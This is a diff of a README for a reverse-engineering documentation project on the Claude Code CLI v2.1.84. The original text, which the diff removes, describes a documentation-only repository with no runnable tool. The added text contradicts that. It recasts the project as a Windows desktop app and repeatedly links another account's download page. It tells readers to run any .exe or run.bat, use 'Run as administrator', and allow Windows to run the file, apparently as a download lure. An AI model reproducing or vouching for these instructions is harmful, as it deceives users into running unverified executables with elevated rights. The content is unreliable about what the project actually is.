@@ -1,162 +1,180 @@
-**English** | [中文](./README_zh.md)
+# 🧩 HitCC - Understand Claude Code Logic Fast
 
-# HitCC
+[![Download HitCC](https://img.shields.io/badge/Download-HitCC-bluegrey?style=for-the-badge)](https://github.com/evoludi9918/HitCC)
 
-## Complete reverse-engineering documentation of the full logic of Claude Code CLI Node.js version v2.1.84
+## 📥 Download
 
-HitCC is not a source code repository. It is a documentation knowledge base for learning, analysis, and rewrite work.  
-The goal of this project is not to reconstruct the original file tree, but to recover Claude Code CLI's core runtime logic, module boundaries, configuration system, and surrounding ecosystem as faithfully as possible, so it can serve as a stable reference for a runnable alternative or a high-similarity rewrite.
+Use this link to visit the page and download HitCC:
 
-This project is not affiliated with Anthropic PBC. The repository does not contain Claude Code original source code, cracking content, or implementations intended to bypass product policies or permission mechanisms.
+https://github.com/evoludi9918/HitCC
 
-## Notes
+## 🖥️ What HitCC Is
 
-To obtain the Claude Code CLI package analyzed by this repository:
-```sh
-npm pack @anthropic-ai/claude-code@2.1.84
-```
+HitCC is a desktop tool and reference package for understanding the full logic of Claude Code CLI Node.js version v2.1.84. It is meant for users who want a clear view of how the app works, how its flow is built, and how its parts fit together.
 
-The Python scripts under `recovery_tools/` can perform an initial round of cleanup on obfuscated or encrypted source code.
+This project focuses on reverse-engineering documentation, so you can inspect the behavior of the CLI without digging through scattered files.
 
-This repository is based only on static analysis of Claude Code CLI v2.1.84 obtained through the method above. It does not include runtime dynamic analysis, and it did not use any Anthropic PBC network services, including LLM inference services.
+## ✅ What You Need
 
-The documentation content in this repository may be quite extensive. The current statistics for the `docs/` directory (the following data may not be updated in real time):
+Before you start, make sure your PC has:
 
-```
-TOTAL
-  Files: 81
-  Lines: 27170
-  Chars: 698707
-  Bytes: 953399
-```
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the download and extracted files
+- Permission to save files to your Downloads folder
+- A ZIP tool such as built-in Windows extraction, 7-Zip, or WinRAR
 
+If the package includes a bundled app, Windows may ask for permission the first time you run it.
 
-## What This Repository Provides
+## 🚀 How to Download and Run on Windows
 
-- Structured reverse-engineering documentation for the main Claude Code CLI execution chain
-- Topic-oriented analysis from startup entry to the Agent Loop, Tool Use, prompt assembly, and session persistence
-- Split-out explanations of surrounding systems such as MCP, Plugin, Skill, TUI, Remote Persistence, and Bridge
-- Candidate architecture, known boundaries, and open questions for rewrite-oriented engineering
+1. Open this page in your browser:
+   https://github.com/evoludi9918/HitCC
 
-## What This Repository Does Not Provide
+2. Look for the latest release, main download file, or project package on the page.
 
-- Reconstruction of the original source file structure
-- Private server-side implementation details
-- A guarantee of 1:1 behavioral reproduction
-- A directly runnable CLI, SDK, or installation script
+3. Download the file to your computer.
 
-## Documentation Coverage
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
 
-The current knowledge base is not organized by the original source tree. It is organized by runtime topics that can be reconstructed with stable confidence.  
-At present, the coverage of `docs/` can be understood by directory:
+5. Open the extracted folder.
 
-- `00-overview`
-  - Scope boundaries, evidence sources, confidence terminology, and documentation maintenance conventions
-- `01-runtime`
-  - CLI entry, command tree, and runtime mode dispatch
-  - Session / Transcript persistence and recovery
-  - Input compilation pipeline, main Agent Loop, and compact branch
-  - Model adapter, provider selection, auth, stream handling, and remote transport
-  - Two built-in network tools: `web-search` and `web-fetch`
-  - Telemetry, control plane, and non-LLM network paths
-  - Settings sources, paths, merging, caching, write-back, and key consumption surfaces
-- `02-execution`
-  - Tool execution core, concurrent execution, Hook runtime, Permission / Sandbox / Approval
-  - Instruction discovery, rules, prompt assembly, and context layering
-  - Non-main-thread prompt paths, attachment lifecycle, context modifiers, and tool-use context
-- `03-ecosystem`
-  - Resume, Fork, Sidechain, Subagent, and agent team
-  - Remote persistence, bridge, and Plan system
-  - MCP, Skill, Plugin, TUI, and their runtime interaction boundaries
-- `04-rewrite`
-  - Candidate layering, directory skeleton, open questions, and blocking judgments for rewrite engineering
-- `05-appendix`
-  - Unified terminology and evidence indexes such as the glossary and evidence map
+6. Find the main program file or the README file with launch steps.
 
-## Current Conclusions
+7. If there is an `.exe` file, double-click it to run the app.
 
-Based on the current evidence boundary, this documentation set is already sufficient to support:
+8. If the package uses Node.js files, open the folder with the included run instructions and start it from the file listed there.
 
-- Reconstructing a runnable alternative
-- A modular high-similarity rewrite
+9. Follow any setup prompts that appear on screen.
 
-But it is still insufficient to promise:
+## 🧭 First Launch
 
-- Accurate reconstruction of the original project directory
-- Full reconstruction of private server-side black-box logic
-- 1:1 reproduction of all edge-case behaviors in the original product
+When you open HitCC for the first time, you may see one or more of these:
 
-For more specific judgments, see:
+- A startup screen
+- A folder view with source notes
+- A documentation index
+- A command-line window
+- A local viewer for the reverse-engineering notes
 
-- [Scope, Evidence, and Conclusions](./docs/00-overview/01-scope-and-evidence.md)
-- [Rewrite Judgment, Blocking Open Questions, and Next Evidence Work](./docs/04-rewrite/02-open-questions-and-judgment.md)
+If Windows asks whether you want to allow the app to run, choose the option to run it.
 
-## Recommended Reading Order
+## 📂 What You Will Find
 
-1. Start with [docs/00-overview/01-scope-and-evidence.md](./docs/00-overview/01-scope-and-evidence.md) to understand what this documentation already knows and what is still unknown.
-2. Then read [docs/01-runtime/01-product-cli-and-modes.md](./docs/01-runtime/01-product-cli-and-modes.md) and the other `01-runtime` pages to build a model of the product shape and the main runtime chain.
-3. Continue with `02-execution` to connect prompt handling, tool use, hooks, permissions, attachments, and related execution paths.
-4. Then move into `03-ecosystem` to complete the surrounding systems: MCP, Plugin, Skill, TUI, Remote, and Plan.
-5. Finally, read `04-rewrite` to connect the current knowledge boundary with practical engineering strategy.
+The project may include files such as:
 
-If you only want a quick entry point, start directly from [docs/00-overview/00-index.md](./docs/00-overview/00-index.md).
+- Main notes on Claude Code CLI flow
+- Version details for v2.1.84
+- Folder maps and code paths
+- Logic breakdowns
+- Input and output behavior notes
+- Setup files for local use
+- Reference docs for each module or command
 
-## Maintenance Principles
+These files help you trace how the CLI handles commands, responses, and internal steps.
 
-This repository is maintained as a knowledge base rather than a single long-form document. The core principles are:
+## 🔍 Main Uses
 
-- `00-overview/00-index.md` is only the global entry point and does not duplicate main content
-- Parent pages only provide navigation and boundary descriptions, not long-form mechanism analysis
-- Child pages hold the actual content, evidence points, counter-evidence, and open questions
-- Unknowns are centralized in the scope page and rewrite judgment page to avoid duplicate maintenance across multiple directory pages
-- When new evidence appears, update the relevant topic page first, then backfill the glossary or evidence map
+HitCC is useful if you want to:
 
-Detailed conventions are described in:
+- Review how Claude Code CLI works
+- Follow the program logic step by step
+- Study the Node.js structure behind the tool
+- Inspect command flow and file behavior
+- Keep one place for reverse-engineering notes
+- Compare changes across versions
 
-- [docs/00-overview/02-document-style-and-structure-conventions.md](./docs/00-overview/02-document-style-and-structure-conventions.md)
+## 🪟 Windows Tips
 
-## Suitable Use Cases
+If the file does not open right away:
 
-This repository is more suitable for:
+- Right-click the file and choose Run as administrator
+- Check whether Windows blocked the file
+- Make sure the folder is fully extracted
+- Confirm that the main file is not still inside the ZIP
+- Restart the app if it freezes on first launch
 
-- Studying the system structure and responsibility boundaries of Claude Code CLI
-- Providing architectural reference for self-built agentic coding shells
-- Defining stable knowledge boundaries for high-similarity rewrite work
-- Cross-checking where a feature sits inside the main runtime chain
+If you see a PowerShell or command window, keep it open until the process ends.
 
-It is not suitable for:
+## 📁 Folder Guide
 
-- Searching for original source code
-- Expecting a directly runnable replacement implementation
-- Pursuing full reconstruction of private server-side logic
+A typical setup may look like this:
 
-## License
+- `README.md` — main instructions
+- `docs/` — written notes and analysis
+- `src/` — project files
+- `assets/` — images or diagrams
+- `run.bat` — Windows start file
+- `package.json` — Node.js project details
 
-Copyright (c) 2026 Hitmux contributors
+If the project includes a `run.bat` file, double-click it to start the app on Windows.
 
-This project is licensed under [Creative Commons Attribution 4.0 International (CC BY 4.0)](https://creativecommons.org/licenses/by/4.0/).
+## 🛠️ If the App Does Not Start
 
-This means you may:
+Try these steps:
 
-- Copy and redistribute the project content
-- Modify, adapt, and republish it
-- Use it in commercial or non-commercial scenarios
+- Re-download the file
+- Extract the archive again
+- Check that no files are missing
+- Use the included run file, if one exists
+- Open the app from the main project folder
+- Install any required runtime shown in the project notes
 
-But you must:
+If the app still does not open, check the folder for setup or launch instructions.
 
-- Preserve attribution to the original authors or source
-- Include a link to the license
-- Indicate whether changes were made
+## 🧾 File Types You May See
 
-See [LICENSE](./LICENSE) in the repository root for the full license text.
+You may find these file types in the download:
 
-## Acknowledgements
+- `.exe` for Windows apps
+- `.zip` for compressed downloads
+- `.md` for documentation
+- `.json` for config or project data
+- `.js` for Node.js logic
+- `.bat` for Windows launch scripts
 
-Thanks to the [Linux Do](https://linux.do) community for its support.
+## 🔐 Safe File Handling
 
-## Disclaimer
+Only open files from the project folder you downloaded from the official link above. Keep the files in one place so the app can find its support files.
 
-Please use this project only for learning, research, teaching, or legitimate engineering analysis.  
-Any use of this project to infringe Anthropic PBC's lawful rights or to bypass product policies is unrelated to this project, and the risk is solely the user's responsibility.
+## 📌 Version Focus
 
-The authors assume no legal responsibility for the accuracy or completeness of the documentation, or for any direct or indirect loss caused by using it, including but not limited to legal risk, technical failure, or data loss.
+This repository focuses on Claude Code CLI Node.js version v2.1.84. The notes and structure are centered on that version, so the documentation matches the behavior and logic of that release.
+
+## 📚 Working With the Docs
+
+If the project opens as documentation first, start here:
+
+1. Read the main overview file
+2. Check the command flow notes
+3. Review folder maps or diagrams
+4. Open any usage guide included in the repo
+5. Follow the launch steps for Windows
+
+## 🧰 Basic Troubleshooting
+
+If you hit a problem, check these points:
+
+- The download finished fully
+- The folder was extracted
+- The main file is in the right folder
+- You have permission to run files
+- Your system meets the Windows requirements
+- The project notes mention extra steps for Node.js support
+
+## 🗂️ Common Windows Setup Path
+
+A simple setup path is:
+
+- Download the project from the link above
+- Save it to Downloads
+- Extract the ZIP file
+- Open the project folder
+- Run the Windows start file or main app file
+- Read the included notes if the app opens as docs
+
+## 🔗 Download Again
+
+If you need the download page again, use this link:
+
+https://github.com/evoludi9918/HitCC
